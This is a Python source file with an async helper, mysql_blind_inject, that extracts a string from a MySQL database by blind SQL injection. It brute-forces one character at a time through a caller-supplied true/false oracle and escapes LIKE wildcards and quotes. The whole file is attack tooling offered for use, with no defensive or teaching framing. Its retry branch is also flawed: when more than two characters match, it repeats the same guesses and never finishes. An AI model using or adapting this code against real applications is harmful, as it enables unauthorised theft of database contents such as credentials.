import httpx
import asyncio as ai
from typing import *

async def mysql_blind_inject(sender_func: Callable[[str],Awaitable[bool]], 
                             char_table:str="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`-=[]\\;',./!@#$%^&*()~_+{|}:\"<>? ", 
                             char_need_escaped:str="_%'",
                             need_print:bool=False)->str:
  ret=""
  while True:
    tasks:List[Awaitable[bool]]=[]
    for c in char_table:
      if c in char_need_escaped:
        c='\\'+c
      tasks.append(sender_func(ret+c))
    ret_list=await ai.gather(*tasks)
    count=ret_list.count(True)
    if count==0:
      if need_print:
        print("\nend")
      break
    elif count>2:
      if need_print:
        print(f"\nwaring: count={count}",end='')
        for i in range(len(char_table)):
          if ret_list[i]:
            print(f"  {char_table[i]}",end='')
        print('')
      continue
    else:
      ret+=char_table[ret_list.index(True)]
      if need_print:
        print('\r'+ret,end='')
  return ret
